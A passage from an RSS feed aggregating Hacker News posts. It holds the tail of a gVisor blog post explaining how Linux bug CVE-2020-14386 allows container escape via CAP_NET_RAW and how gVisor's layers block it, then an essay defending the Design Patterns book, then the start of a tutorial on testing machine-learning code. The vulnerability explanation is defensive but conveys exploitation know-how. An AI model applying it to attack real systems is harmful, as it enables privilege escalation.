        <span>netoff</span> <span>=</span> <span>TPACKET_ALIGN</span><span>(</span><span>po</span><span>-&gt;</span><span>tp_hdrlen</span> <span>+</span>
                       <span>(</span><span>maclen</span> <span>&lt;</span> <span>16</span> <span>?</span> <span>16</span> <span>:</span> <span>maclen</span><span>))</span> <span>+</span>
                       <span>po</span><span>-&gt;</span><span>tp_reserve</span><span>;</span>
        <span>if</span> <span>(</span><span>po</span><span>-&gt;</span><span>has_vnet_hdr</span><span>)</span> <span>{</span>
            <span>netoff</span> <span>+=</span> <span>sizeof</span><span>(</span><span>struct</span> <span>virtio_net_hdr</span><span>);</span>
            <span>do_vnet</span> <span>=</span> <span>true</span><span>;</span>
        <span>}</span>
        <span>// Attacker controls netoff and can make macoff be smaller than sizeof(struct virtio_net_hdr)</span>
        <span>macoff</span> <span>=</span> <span>netoff</span> <span>-</span> <span>maclen</span><span>;</span>
    <span>}</span>
<span>// ...</span>
    <span>// "macoff - sizeof(struct virtio_net_hdr)" can be negative, resulting in a pointer before h.raw</span>
    <span>if</span> <span>(</span><span>do_vnet</span> <span>&amp;&amp;</span>
        <span>virtio_net_hdr_from_skb</span><span>(</span><span>skb</span><span>,</span> <span>h</span><span>.</span><span>raw</span> <span>+</span> <span>macoff</span> <span>-</span>
                    <span>sizeof</span><span>(</span><span>struct</span> <span>virtio_net_hdr</span><span>),</span>
                    <span>vio_le</span><span>(),</span> <span>true</span><span>,</span> <span>0</span><span>))</span> <span>{</span>
<span>// ...</span>
</code></pre></div></div>

<p>The <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>CAP_NET_RAW</code></a>
capability is required to create the socket above. However, in order to support
common debugging tools like <code>ping</code> and <code>tcpdump</code>, Docker containers, including
those created for Kubernetes, are given <code>CAP_NET_RAW</code> by default and thus may be
able to trigger this vulnerability to elevate privileges and escape the
container.</p>

<p>Next, we are going to explore why this vulnerability doesn’t work in gVisor, and
how gVisor could prevent the escape even if a similar vulnerability existed
inside gVisor’s kernel.</p>

<h2 id="default-protections">Default Protections</h2>

<p>gVisor does not implement <code>PACKET_RX_RING</code>, but <strong>does</strong> support raw sockets
which are required for <code>PACKET_RX_RING</code>. Raw sockets are a controversial feature
to support in a sandbox environment. While it allows great customizations for
essential tools like <code>ping</code>, it may allow packets to be written to the network
without any validation. In general, allowing an untrusted application to write
crafted packets to the network is a questionable idea and a historical source of
vulnerabilities. With that in mind, if <code>CAP_NET_RAW</code> is enabled by default, it
would not be <em>secure by default</em> to run untrusted applications.</p>

<p>After multiple discussions when raw sockets were first implemented, we decided
to disable raw sockets by default, <strong>even if <code>CAP_NET_RAW</code> is given to the
application</strong>. Instead, enabling raw sockets in gVisor requires the admin to set
<code>--net-raw</code> flag to runsc when configuring the runtime, in addition to requiring
the <code>CAP_NET_RAW</code> capability in the application. It comes at the expense that
some tools may not work out of the box, but as part of our
<a href="https://gvisor.dev/blog/2019/11/18/gvisor-security-basics-part-1/#secure-by-default">secure-by-default</a>
principle, we felt that it was important for the “less secure” configuration to
be explicit.</p>

<p>Since this bug was due to an overflow in the specific Linux implementation of
the packet ring, gVisor’s raw socket implementation is not affected. However, if
there were a vulnerability in gVisor, containers would not be allowed to exploit
it by default.</p>

<p>As an alternative way to implement this same constraint, Kubernetes allows
<a href="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/">admission controllers</a>
to be configured to customize requests. Cloud providers can use this to
implement more stringent policies. For example, GKE implements an admission
controller for gVisor that
<a href="https://cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods#capabilities">removes <code>CAP_NET_RAW</code> from gVisor pods</a>
unless it has been explicitly set in the pod spec.</p>

<h2 id="isolated-kernel">Isolated Kernel</h2>

<p>gVisor has its own application kernel, called the Sentry, that is distinct from
the host kernel. Just like what you would expect from a kernel, gVisor has a
memory management subsystem, virtual file system, and a full network stack. The
host network is only used as a transport to carry packets in and out the
sandbox<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. The loopback interface which is used in the exploit stays
completely inside the sandbox, never reaching the host.</p>

<p>Therefore, even if the Sentry was vulnerable to the attack, there would be two
factors that would prevent a container escape from happening. First, the
vulnerability would be limited to the Sentry, and the attacker would compromise
only the application kernel, bound by a restricted set of
<a href="https://en.wikipedia.org/wiki/Seccomp">seccomp</a> filters, discussed more in
depth below. Second, the Sentry is a distinct implementation of the API, written
in Go, which provides bounds checking that would have likely prevented access
past the bounds of the shared region (e.g. see
<a href="https://cs.opensource.google/gvisor/gvisor/+/master:pkg/sentry/syscalls/linux/vfs2/aio.go;l=210;drc=a11061d78a58ed75b10606d1a770b035ed944b66?q=file:aio&amp;ss=gvisor%2Fgvisor">aio</a>
or
<a href="https://cs.opensource.google/gvisor/gvisor/+/master:pkg/sentry/kernel/kcov.go;l=272?q=file:kcov&amp;ss=gvisor%2Fgvisor">kcov</a>,
which have similar shared regions).</p>

<p>Here, Kubernetes warrants slightly more explanation. gVisor makes pods the unit
of isolation and a pod can run multiple containers. In other words, each pod is
a gVisor instance, and each container is a set of processes running inside
gVisor, isolated via Sentry-internal namespaces like regular containers inside a
pod. If there were a vulnerability in gVisor, the privilege escalation would
allow a container inside the pod to break out to other <strong>containers inside the
same pod</strong>, but the container still <strong>cannot break out of the pod</strong>.</p>

<h2 id="defense-in-depth">Defense in Depth</h2>

<p>gVisor follows a
<a href="https://cloud.google.com/security/infrastructure/design/resources/google_infrastructure_whitepaper_fa.pdf">common security principle used at Google</a>
that the system should have two layers of protection, and those layers should
require different compromises to be broken. We apply this principle by assuming
that the Sentry (first layer of defense)
<a href="https://gvisor.dev/blog/2019/11/18/gvisor-security-basics-part-1/#defense-in-depth">will be compromised and should not be trusted</a>.
In order to protect the host kernel from a compromised Sentry, we wrap it around
many security and isolations features to ensure only the minimal set of
functionality from the host kernel is exposed.</p>

<p><img src="https://gvisor.dev/assets/images/2020-09-18-containing-a-real-vulnerability-figure1.png" alt="Figure 1" title="Protection layers."></p>

<p>First, the sandbox runs inside a cgroup that can limit and throttle host
resources being used. Second, the sandbox joins empty namespaces, including user
and mount, to further isolate from the host. Next, it changes the process root
to a read-only directory that contains only <code>/proc</code> and nothing else. Then, it
executes with the unprivileged user/group
<a href="https://en.wikipedia.org/wiki/Nobody_/(username/)"><code>nobody</code></a> with all
capabilities stripped. Last and most importantly, a seccomp filter is added to
tightly restrict what parts of the Linux syscall surface that gVisor is allowed
to access. The allowed host surface is a far smaller set of syscalls than the
Sentry implements for applications to use. Not only restricting the syscall
being called, but also checking that arguments to these syscalls are within the
expected set. Dangerous syscalls like <code>execve(2)</code>,
<code>open(2)</code>, and <code>socket(2)</code> are prohibited, thus an
attacker isn’t able to execute binaries or acquire new resources on the host.</p>

<p>if there were a vulnerability in gVisor that allowed an attacker to execute code
inside the Sentry, the attacker still has extremely limited privileges on the
host. In fact, a compromised Sentry is much more restricted than a
non-compromised regular container. For CVE-2020-14386 in particular, the attack
would be blocked by more than one security layer: non-privileged user, no
capability, and seccomp filters.</p>

<p>Although the surface is drastically reduced, there is still a chance that there
is a vulnerability in one of the allowed syscalls. That’s why it’s important to
keep the surface small and carefully consider what syscalls are allowed. You can
find the full set of allowed syscalls
<a href="https://cs.opensource.google/gvisor/gvisor/+/master:runsc/boot/filter/">here</a>.</p>

<p>Another possible attack vector is resources that are present in the Sentry, like
open file descriptors. The Sentry has file descriptors that an attacker could
potentially use, such as log files, platform files (e.g. <code>/dev/kvm</code>), an RPC
endpoint that allows external communication with the Sentry, and a Netstack
endpoint that connects the sandbox to the network. The Netstack endpoint in
particular is a concern because it gives direct access to the network. It’s an
<code>AF_PACKET</code> socket that allows arbitrary L2 packets to be written to the
network. In the normal case, Netstack assembles packets that go out the network,
giving the container control over only the payload. But if the Sentry is
compromised, an attacker can craft packets to the network. In many ways this is
similar to anyone sending random packets over the internet, but still this is a
place where the host kernel surface exposed is larger than we would like it to
be.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Security comes with many tradeoffs that are often hard to make, such as the
decision to disable raw sockets by default. However, these tradeoffs have …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gvisor.dev/blog/2020/09/18/containing-a-real-vulnerability">https://gvisor.dev/blog/2020/09/18/containing-a-real-vulnerability</a></em></p>]]>
            </description>
            <link>https://gvisor.dev/blog/2020/09/18/containing-a-real-vulnerability</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524408</guid>
            <pubDate>Sat, 19 Sep 2020 02:36:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24524046">thread link</a>) | @pietromenna
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524046</guid>
            <pubDate>Sat, 19 Sep 2020 01:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Test Machine Learning Code and Systems]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24523930">thread link</a>) | @7d7n
<br/>
September 18, 2020 | https://eugeneyan.com/writing/testing-ml/ | <a href="https://web.archive.org/web/*/https://eugeneyan.com/writing/testing-ml/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Two weeks ago, <a href="https://twitter.com/jeremyjordan" target="_blank">Jeremy</a> wrote a great post on <a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">Effective Testing for Machine Learning Systems</a>. He distinguished between traditional software tests and machine learning (ML) tests; software tests check the <strong>written logic</strong> while ML tests check the <strong>learned logic</strong>.</p>

<p>ML tests can be further split into <strong>testing</strong> and <strong>evaluation</strong>. We’re familiar with ML <strong>evaluation</strong> where we train a model and evaluate its performance on an unseen validation set; this is done via metrics (e.g., accuracy, <a href="https://en.wikipedia.org/wiki/Receiver_operating_characteristic#Area_under_the_curve" target="_blank">Area under Curve of Receiver Operating Characteristic (AUC ROC)</a>) and visuals (e.g., <a href="https://eugeneyan.com/writing/recommender-systems-baseline-pytorch/#implementation-2-matrix-factorization-with-bias" target="_blank">precision-recall curve</a>).</p>

<p>On the other hand, ML <strong>testing</strong> involves checks on model behaviour. <strong>Pre-train tests</strong>—which can be run without trained parameters—check if our <em>written logic</em> is correct. For example, is classification probability between 0 to 1? <strong>Post-train tests</strong> check if the <em>learned logic</em> is expected. For example, on the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>, we should expect females to have a higher survival probability (relative to males).</p>

<p><img src="https://eugeneyan.com/assets/testing-ml-flow.jpg" title="Workflow for testing machine learning" alt="Workflow for testing machine learning"></p>
<p>Workflow for testing machine learning (<a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">source</a>)</p>

<p>Taken together, here’s how the workflow might look like. To complement this, we’ll implement a machine learning model and run the following tests on it:</p>
<ul>
  <li><a href="#pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</a></li>
  <li><a href="#post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</a></li>
  <li><a href="#model-evaluation-to-ensure-satisfactory-performance">Evaluation to ensure satisfactory model performance</a></li>
</ul>

<blockquote>
  <p>Follow along with the code in this Github repository: <a href="https://github.com/eugeneyan/testing-ml" target="_blank"><code>testing-ml</code></a></p>
</blockquote>

<h2 id="setting-up-the-context-algorithm-and-data">Setting up the context (algorithm and data)</h2>

<p>Before we can do ML testing, we’ll need an <strong>algorithm and some data</strong>. Our algorithm will be a <a href="https://numpy.org/" target="_blank"><code>numpy</code></a> implementation of <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py" target="_blank"><code>DecisionTree</code></a> which predicts a probability for binary classification. (<a href="#try-it-for-yourself-and-break-something">Extensions to make it support regression welcome!</a>).</p>

<p>To run our tests, we’ll use the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>. This tiny data set (~900 rows, 10 features) makes for fast testing (when model training is involved) and allows us to iterate quickly. (As part of performance evaluation, we run <code>fit()</code> and <code>predict()</code> hundreds of times to get the 99th percentile timing.) The simplicity and familiarity of the data also makes it easier to discuss the post-train (i.e., learned logic) tests.</p>

<div><div><pre><code>+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
| PassengerId | Survived | Pclass | Name                                    | Sex    | Age | SibSp | Parch | Ticket    |    Fare | Cabin | Embarked |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------|
|           1 |        0 |      3 | Braund, Mr. Owen Harris                 | male   |  22 |     1 |     0 | A/5 21171 |    7.25 | nan   | S        |
|           2 |        1 |      1 | Cumings, Mrs. John Bradley (Florence... | female |  38 |     1 |     0 | PC 17599  | 71.2833 | C85   | C        |
|           3 |        1 |      3 | Heikkinen, Miss. Laina                  | female |  26 |     0 |     0 | STON/O2.  |   7.925 | nan   | S        |
|           4 |        1 |      1 | Futrelle, Mrs. Jacques Heath (Lily M... | female |  35 |     1 |     0 | 113803    |    53.1 | C123  | S        |
|           5 |        0 |      3 | Allen, Mr. William Henry                | male   |  35 |     0 |     0 | 373450    |    8.05 | nan   | S        |
|           6 |        0 |      3 | Moran, Mr. James                        | male   | nan |     0 |     0 | 330877    |  8.4583 | nan   | Q        |
|           7 |        0 |      1 | McCarthy, Mr. Timothy J                 | male   |  54 |     0 |     0 | 17463     | 51.8625 | E46   | S        |
|           8 |        0 |      3 | Palsson, Master. Gosta Leonard          | male   |   2 |     3 |     1 | 349909    |  21.075 | nan   | S        |
|           9 |        1 |      3 | Johnson, Mrs. Oscar W (Elisabeth Vil... | female |  27 |     0 |     2 | 347742    | 11.1333 | nan   | S        |
|          10 |        1 |      2 | Nasser, Mrs. Nicholas (Adele Achem)     | female |  14 |     1 |     0 | 237736    | 30.0708 | nan   | C        |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
</code></pre></div></div>
<p>If you're unfamiliar with the Titanic dataset, here's how it looks like (scroll to the right).</p>

<h2 id="adopting-testing-habits-from-software-engineering">Adopting testing habits from software engineering</h2>

<p>We’ll adopt some good habits from software engineering. We won’t go through them in detail here though it was previously covered in another <a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/" target="_blank">post</a>:</p>
<ul>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#write-some-unit-tests-theyre-our-safety-harness" target="_blank">Unit test</a> fixture reuse, exceptions testing, etc with <a href="https://docs.pytest.org/en/latest/" target="_blank"><code>pytest</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-coverage-how-extensive-are-our-tests" target="_blank">Code coverage</a> with <a href="https://coverage.readthedocs.io/en/coverage-5.2.1/" target="_blank"><code>Coverage.py</code></a> and <a href="https://pytest-cov.readthedocs.io/en/latest/" target="_blank"><code>pytest-cov</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#lint-to-ensure-consistency-across-projects" target="_blank">Linting</a> to ensure code consistency with <a href="https://www.pylint.org/" target="_blank"><code>pylint</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-type-errors-to-prevent-them" target="_blank">Type checking</a> to verify type correctness with <a href="http://mypy-lang.org/" target="_blank"><code>mypy</code></a></li>
</ul>

<p>(Note: The tests below won’t include type hints though the <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py#L16" target="_blank">implementation code</a> does.)</p>

<h2 id="pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</h2>

<p>In pre-train tests, we want to <strong>catch errors in our implementation</strong> (i.e., written logic) before training an erroneous model. We can run these tests without a fully trained model.</p>

<p>First, we’ll test our functions of <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Gini_impurity" target="_blank">Gini impurity</a> and <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Information_gain" target="_blank">Gini gain</a>. These will be used to <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#General" target="_blank">split the data</a> and grow our decision tree.</p>

<div><div><pre><code><span>def</span> <span>test_gini_impurity</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.219</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.375</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.469</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.500</span>


<span>def</span> <span>test_gini_gain</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.5</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.0</span>
</code></pre></div></div>

<p>Next, we’ll check if the model prediction shape is expected. We should have the same number of rows as the input features.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_shape</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>pred_train</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as training labels.'</span>
    <span>assert</span> <span>pred_test</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as testing labels.'</span>
</code></pre></div></div>

<p>We’ll also want to check the output ranges. Given that we’re predicting probabilities, we should expect the output to range from 0 to 1 inclusive.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_range</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>(</span><span>pred_train</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_train</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
    <span>assert</span> <span>(</span><span>pred_test</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_test</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
</code></pre></div></div>

<p>Here, we’ll check for test set leakage (i.e., duplicate rows in train/test splits) by concatenating train and test data, dropping duplicates, and checking the number of rows. (Note: Other leakages include <a href="https://www.fast.ai/2017/11/13/validation-sets/#time-series" target="_blank">temporal leaks</a> and <a href="https://en.wikipedia.org/wiki/Leakage_(machine_learning)#Feature_leakage" target="_blank">feature leaks</a>; we won’t cover them here.)</p>

<div><div><pre><code><span>def</span> <span>test_data_leak_in_test_data</span><span>(</span><span>dummy_titanic_df</span><span>):</span>
    <span>train</span><span>,</span> <span>test</span> <span>=</span> <span>dummy_titanic_df</span>

    <span>concat_df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>train</span><span>,</span> <span>test</span><span>])</span>
    <span>concat_df</span><span>.</span><span>drop_duplicates</span><span>(</span><span>inplace</span><span>=</span><span>True</span><span>)</span>

